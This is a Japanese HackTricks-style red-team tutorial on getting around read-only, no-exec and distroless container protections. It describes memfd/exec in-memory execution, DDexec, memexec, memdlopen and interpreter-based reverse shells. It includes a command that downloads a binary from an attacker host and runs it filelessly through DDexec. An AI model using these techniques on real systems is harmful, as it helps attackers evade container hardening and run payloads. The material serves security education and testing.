# ファイルシステムの保護をバイパスする：読み取り専用 / 実行不可 / Distroless

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使用して、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**ハッキングキャリア**に興味があり、**解読不能なものをハック**したい場合は、**採用中**です（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 動画

以下の動画では、このページで言及されているテクニックについて詳しく説明されています：

- [**DEF CON 31 - ステルスと回避のためのLinuxメモリ操作の探索**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**DDexec-ngとインメモリdlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 読み取り専用 / 実行不可シナリオ

Linuxマシンが**読み取り専用（ro）ファイルシステム保護**でマウントされることがますます一般的になっていますが、特にコンテナではそうです。これは、`securitycontext`で**`readOnlyRootFilesystem: true`**を設定するだけで、roファイルシステムでコンテナを実行するのが簡単であるためです：

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
      readOnlyRootFilesystem: true
    command: ["sh", "-c", "while true; do sleep 1000; done"]
```

しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能のままであるため、ディスクに書き込むことができないということはありません。ただし、このフォルダは**実行不可保護**でマウントされるため、ここにバイナリをダウンロードしても**実行できません**。

{% hint style="warning" %}
レッドチームの観点からすると、これはバイナリ（バックドアや`kubectl`のような列挙ツールなど）を**ダウンロードして実行するのが複雑**になります。
{% endhint %}

## 最も簡単なバイパス：スクリプト

バイナリを言及しましたが、インタプリタがマシン内にある限り、**シェルスクリプト**（`sh`が存在する場合）や**Pythonスクリプト**（`python`がインストールされている場合）など、**任意のスクリプトを実行**できます。

ただし、これだけではバイナリバックドアや他の実行する必要があるバイナリツールを実行するのには十分ではありません。

## メモリバイパス

ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行**するのが最善です。なぜなら、**その保護はそこには適用されない**からです。

### FD + execシステムコールバイパス

**Python**、**Perl**、**Ruby**などの強力なスクリプトエンジンがマシン内にある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタに保存し（`create_memfd`システムコール）、これらの保護によって保護されないため、**fdをファイルとして実行する**ために**`exec`システムコール**を呼び出すことができます。

これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、バイナリが**デコードおよび解凍された**スクリプトが生成され、`create_memfd`システムコールを呼び出して作成された**fd**にバイナリを格納し、**実行するためのexec**システムコールが呼び出されます。

{% hint style="warning" %}
これは、PHPやNodeなどの他のスクリプト言語では、スクリプトから**生のシステムコールを呼び出すデフォルトの方法**がないため、`create_memfd`を呼び出して**バイナリを格納するメモリfd**を作成することができないため、これは機能しません。

また、`/dev/shm`内のファイルで**通常のfd**を作成しても機能しないため、**実行不可保護**が適用されるため実行できません。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、**`/proc/self/mem`**を上書きすることで、**自分自身のプロセスのメモリを変更**する技術であり、**プロセスが実行しているアセンブリコード**を制御することで、**シェルコード**を書き込んでプロセスを**任意のコードを実行**するように「変異」させることができます。

{% hint style="success" %}
**DDexec / EverythingExec**を使用すると、**自分自身のメモリから**自分自身の**シェルコード**または**任意のバイナリ**を**ロードして実行**できます。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec)はDDexecの自然な次のステップです。これは**DDexecシェルコードをデーモン化**したもので、異なるバイナリを実行したいときには、DDexecを再起動する必要はありません。代わりに、DDexec技術を使用してmemexecシェルコードを実行し、**このデーモンと通信して新しいバイナリをロードして実行**できます。

**memexecを使用してPHPリバースシェルからバイナリを実行する例**は、[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)で見つけることができます。

### Memdlopen

DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memdlopen)技術は、**メモリにバイナリをロードして後で実行するための簡単な方法**を提供します。これにより、依存関係を持つバイナリをロードすることさえ可能になります。

## Distroless Bypass

### Distrolessとは

Distrolessコンテナには、ライブラリやランタイム依存関係など、**特定のアプリケーションやサービスを実行するために必要な最小限のコンポーネント**だけが含まれており、パッケージマネージャーやシェル、システムユーティリティなどのより大きなコンポーネントは除外されています。

Distrolessコンテナの目標は、**不要なコンポーネントを排除**し、悪用される可能性のある脆弱性の数を最小限に抑えることで、コンテナの攻撃面を**縮小**することです。

### リバースシェル

Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`などが**見つからない**かもしれません。また、`ls`、`whoami`、`id`などのバイナリも見つかりません。これらは通常、システムで実行するものです。

{% hint style="warning" %}
したがって、通常どおりに**リバースシェル**を取得したり、システムを**列挙**することはできません。
{% endhint %}

ただし、侵害されたコンテナが例えばflask webを実行している場合、Pythonがインストールされているため、**Pythonリバースシェル**を取得できます。Nodeを実行している場合はNodeリバースシェルを取得でき、ほとんどの**スクリプト言語**でも同様です。

{% hint style="success" %}
スクリプト言語を使用すると、言語の機能を使用してシステムを**列挙**できます。
{% endhint %}

**`read-only/no-exec`**の保護がない場合、リバースシェルを悪用してファイルシステムに**バイナリを書き込み**、それらを**実行**することができます。

{% hint style="success" %}
ただし、この種のコンテナでは通常、これらの保護が存在しますが、**以前のメモリ実行技術を使用してそれらをバイパス**することができます。
{% endhint %}

**RCE脆弱性を悪用してスクリプト言語のリバースシェルを取得**し、[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)でメモリからバイナリを実行する方法の**例**を見つけることができます。
